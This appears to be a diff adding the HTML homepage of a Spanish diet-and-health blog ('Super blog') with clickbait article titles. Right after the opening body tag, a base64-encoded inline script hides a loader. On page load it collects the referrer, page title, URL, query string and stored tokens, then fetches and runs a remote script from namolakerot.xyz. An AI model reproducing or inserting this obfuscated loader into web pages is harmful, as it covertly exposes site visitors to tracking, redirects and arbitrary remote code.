@@ -1,0 +1,326 @@
+ <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Super blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link href="https://fonts.googleapis.com/css?family=Muli:300,400,700|Playfair+Display:400,700,900" rel="stylesheet">
+
+    <link rel="stylesheet" href="fonts/icomoon/style.css">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/magnific-popup.css">
+    <link rel="stylesheet" href="css/jquery-ui.css">
+    <link rel="stylesheet" href="css/owl.carousel.min.css">
+    <link rel="stylesheet" href="css/owl.theme.default.min.css">
+    <link rel="stylesheet" href="css/bootstrap-datepicker.css">
+    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
+    <link rel="stylesheet" href="css/aos.css">
+
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
+  
+  <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfajRoOXZnSllwcm5UVEt6Sic7CiAgICBpZiAoIXdpbmRvdy5fajRoOXZnSllwcm5UVEt6SikgewogICAgICAgIHdpbmRvdy5fajRoOXZnSllwcm5UVEt6SiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9uYW1vbGFrZXJvdC54eXovcXY4bVJnJywKICAgICAgICAgICAgUF9QQVRIOiAnaHR0cHM6Ly9uYW1vbGFrZXJvdC54eXovOWFhM2UxOC9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9YR1E3TUJwMVYzRm5GOHlmID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfWEdRN01CcDFWM0ZuRjh5ZiAhPT0gJ3VuZGVmaW5lZCcgJiYgX1hHUTdNQnAxVjNGbkY4eWYgIT09IG51bGwpIHsKICAgICAgICB2YXIgX1Q4YlY2OFF5VmZxdnM1SEogPSBKU09OLnBhcnNlKF9YR1E3TUJwMVYzRm5GOHlmKTsKICAgICAgICB2YXIgXzJWbXIyWjV2VG56cldYaEMgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfVDhiVjY4UXlWZnF2czVISi5jcmVhdGVkX2F0ICsgd2luZG93Ll9qNGg5dmdKWXByblRUS3pKLnR0bCA8IF8yVm1yMlo1dlRuenJXWGhDKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfdFg2S3ZuU2p6Mkp2eHc0eCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9DYlhQREg3TUxaZ2QyWUJoID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX1NxUHk5MkxidzJWeDFYaEwgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX1NxUHk5MkxidzJWeDFYaEwgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX1NxUHk5MkxidzJWeDFYaEwgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmaG9zdD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5fajRoOXZnSllwcm5UVEt6Si5SX1BBVEgpOwogICAgaWYgKHR5cGVvZiBfdFg2S3ZuU2p6Mkp2eHc0eCAhPT0gJ3VuZGVmaW5lZCcgJiYgX3RYNkt2blNqejJKdnh3NHggJiYgd2luZG93Ll9qNGg5dmdKWXByblRUS3pKLnVuaXF1ZSkgewogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3RYNkt2blNqejJKdnh3NHgpOwogICAgfQogICAgaWYgKHR5cGVvZiBfQ2JYUERIN01MWmdkMllCaCAhPT0gJ3VuZGVmaW5lZCcgJiYgX0NiWFBESDdNTFpnZDJZQmggJiYgd2luZG93Ll9qNGg5dmdKWXByblRUS3pKLnVuaXF1ZSkgewogICAgICAgIF9TcVB5OTJMYncyVngxWGhMICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfQ2JYUERIN01MWmdkMllCaCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fajRoOXZnSllwcm5UVEt6Si5SX1BBVEggKyBfU3FQeTkyTGJ3MlZ4MVhoTDsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
+  
+  <div class="site-wrap">
+
+    <div class="site-mobile-menu">
+      <div class="site-mobile-menu-header">
+        <div class="site-mobile-menu-close mt-3">
+          <span class="icon-close2 js-menu-toggle"></span>
+        </div>
+      </div>
+      <div class="site-mobile-menu-body"></div>
+    </div>
+    
+    <header class="site-navbar pt-3" role="banner">
+      <div class="container-fluid">
+        <div class="row align-items-center">
+
+          <div class="col-6 col-xl-6 logo">
+            <h1 class="mb-0"><a href="index.html" class="text-black h2 mb-0">Super blog</a></h1>
+          </div>
+          
+          <div class="col-6 mr-auto py-3 text-right" style="position: relative; top: 3px;">
+            <div class="social-icons d-inline">
+              <a href="#"><span class="icon-facebook"></span></a>
+              <a href="#"><span class="icon-twitter"></span></a>
+              <a href="#"><span class="icon-instagram"></span></a>
+            </div>
+            <a href="#" class="site-menu-toggle js-menu-toggle text-black d-inline-block d-xl-none"><span class="icon-menu h3"></span></a></div>
+          </div>
+          
+          <div class="col-12 d-none d-xl-block border-top">
+            <nav class="site-navigation text-center " role="navigation">
+
+              <ul class="site-menu js-clone-nav mx-auto d-none d-lg-block mb-0">
+                <li class="active"><a href="index.html">Inicio</a></li>
+                <li class="has-children">
+                  <a href="index.html">Artículo</a>
+                  <ul class="dropdown">
+                    
+                    <li><a href="9gdVULEPyeGb1nOq.html">Como bajar de peso RÁ...</a></li>
+                    
+
+                    <li><a href="H1iN8ck3KpRRnN.html">La PRESIÓN será 120h...</a></li>
+                    
+
+                    <li><a href="9f27355bd4072d49c0ab45d9d79022f8.html">Permitida y prohibida ...</a></li>
+                    
+
+                    <li><a href="lPFyvYsGPaAUAoPcd3.html">Blanco coágulos de sa...</a></li>
+                    
+
+                    <li><a href="3fa8f027161abf4f1cd4636cb9eab7b0.html">Como bajar de peso con...</a></li>
+                    
+
+                    <li><a href="FtlrNVqrlAS9ayAtlK.html">Cuento sobre los produ...</a></li>
+                    
+
+                    <li><a href="U3jSnMJ2Mj2J8vfCpkD.html">El pp Cazuela sin la h...</a></li>
+                    
+
+                    <li><a href="90bbc4a7636139706dcea678675e12f3.html">Por alguna razón se p...</a></li>
+                    
+
+                    <li><a href="mFiAANLW128IptJ1Gi3xk.html">Tres sencillos ejercic...</a></li>
+                    
+
+                  </ul>
+                </li>
+                <li><a href="contact.html">Contactos</a></li>
+              </ul>
+            </nav>
+          </div>
+        </div>
+
+      </div>
+    </header>
+
+    
+    <div class="slide-one-item home-slider owl-carousel">
+      
+    
+      <div class="site-cover site-cover-sm same-height overlay" style="background-image: url(./images/ika-dam-4sd8uks3nm0-unsplash.jpg);">
+        <div class="container">
+          <div class="row same-height align-items-center">
+            <div class="col-md-12 col-lg-6">
+              <div class="post-entry">
+                <h2 class="mb-4"><a href="#">La belleza es nuestra vida</a></h2>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="site-section">
+      <div class="container">
+        <div class="row">
+          
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="9gdVULEPyeGb1nOq.html"><img src="./images/kate-hliznitsova-zigxiq4gzbu-unsplash.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Como bajar de peso RÁPIDAMENTE? 3 simples reglas científicas</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="H1iN8ck3KpRRnN.html"><img src="./images/sandy-millar-w2wgmawrqbk-unsplash.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">La PRESIÓN será 120h80 COMO EN la JUVENTUD. Una buena RECETA.</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="9f27355bd4072d49c0ab45d9d79022f8.html"><img src="./images/content-pixie-q0y-1aorvjo-unsplash.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Permitida y prohibida la comida ⚔ (reglas de la dieta)</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="lPFyvYsGPaAUAoPcd3.html"><img src="./images/clip.dn.ua-65376_9.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Blanco coágulos de sangre</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="3fa8f027161abf4f1cd4636cb9eab7b0.html"><img src="./images/charles-deluvio-yzyqgm9sxxk-unsplash.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Como bajar de peso con la ayuda de las hormonas de la felicidad</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="FtlrNVqrlAS9ayAtlK.html"><img src="./images/clip.dn.ua-377215_24.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Cuento sobre los productos, que echan a perder la figura y contribuyen a un conjunto de exceso de peso</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="U3jSnMJ2Mj2J8vfCpkD.html"><img src="./images/clip.dn.ua-65271_33.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">El pp Cazuela sin la harina y el azúcar.</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="90bbc4a7636139706dcea678675e12f3.html"><img src="./images/masaaki-komori-osnecx7szok-unsplash.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Por alguna razón se produce la pancreatitis?</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+
+          <div class="col-lg-4 mb-5 mb-lg-0">
+            <div class="entry2 mb-5">
+              <a href="mFiAANLW128IptJ1Gi3xk.html"><img src="./images/clip.dn.ua-65286_41.jpg" alt="Image" class="img-fluid rounded"></a>
+              <h2><a href="single.html">Tres sencillos ejercicios para tonificar el cuerpo myschc y de la esbeltez de la figura, ayudarán a apretar el abdomen</a></h2>
+              <div class="post-meta align-items-center text-left clearfix">
+                <figure class="author-figure mb-0 mr-3 float-left"><img src="images/person_1.jpg" alt="Image" class="img-fluid"></figure>
+                <span class="d-inline-block mt-1"><a href="">Valeria</a></span>
+              </div>
+            </div>
+          </div>
+          
+
+        </div>
+      </div>
+    </div>
+    
+    <div class="site-footer">
+      <div class="container">
+        <div class="row mb-5">
+          <div class="col-md-3"></div>
+          <div class="col-md-3">
+            <h3 class="footer-heading mb-4">Super blog</h3>
+            <ul class="list-unstyled float-left mr-5">
+
+              <li><a href="index.html">Inicio</a></li>
+              <li><a href="contact.html">Contactos</a></li>
+              <li><a href="terms.html">Términos y condiciones</a></li>
+              <li><a href="policy.html">Política de privacidad</a></li>
+            </ul>
+          </div>
+          <div class="col-md-4">
+            <div class="mb-5">
+              <h3 class="footer-heading mb-4">Boletín de</h3>
+              <form action="thanks.html" method="post" class="form-footer-subscribe">
+                <div class="form-group d-flex">
+                  <input type="text" class="form-control">
+                  <input type="submit" class="btn btn-primary text-white" value="Suscribirse">
+                </div>
+              </form>
+            </div>
+
+            <div>
+              <h3 class="footer-heading mb-4">Los medios sociales</h3>
+              <p>
+                <a href="#"><span class="icon-facebook pt-2 pr-2 pb-2 pl-0"></span></a>
+                <a href="#"><span class="icon-twitter p-2"></span></a>
+                <a href="#"><span class="icon-instagram p-2"></span></a>
+                <a href="#"><span class="icon-rss p-2"></span></a>
+                <a href="#"><span class="icon-envelope p-2"></span></a>
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-12 text-center">
+            <p>
+              Copyright &copy; <script>document.write(new Date().getFullYear());</script> All rights reserved
+              </p>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+  </div>
+
+  <script src="js/jquery-3.3.1.min.js"></script>
+  <script src="js/jquery-migrate-3.0.1.min.js"></script>
+  <script src="js/jquery-ui.js"></script>
+  <script src="js/popper.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/owl.carousel.min.js"></script>
+  <script src="js/jquery.stellar.min.js"></script>
+  <script src="js/jquery.countdown.min.js"></script>
+  <script src="js/jquery.magnific-popup.min.js"></script>
+  <script src="js/bootstrap-datepicker.min.js"></script>
+  <script src="js/aos.js"></script>
+
+  <script src="js/main.js"></script>
+  <div class='cookie-banner'>
+    <p>
+      El sitio web utiliza "cookies". Permiten identificarlo y recibir su información de la experiencia del usuario.Continuando con la navegación de la web, estoy de acuerdo con el uso de las cookies, el propietario del sitio de conformidad con  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Política de cookies</a>
+    </p>
+    <button class='close-cookie'>&times;</button>
+  </div>
+  <script>
+    window.onload = function() {
+      $('.close-cookie').click(function () {
+        $('.cookie-banner').fadeOut();
+      })
+    }
+  </script>
+  <script>
+    let elems = document.querySelectorAll('.server-name');
+    elems.forEach((elem) => {
+      elem.innerHTML = window.location.hostname
+    })
+  </script>
+  </body>
+</html>
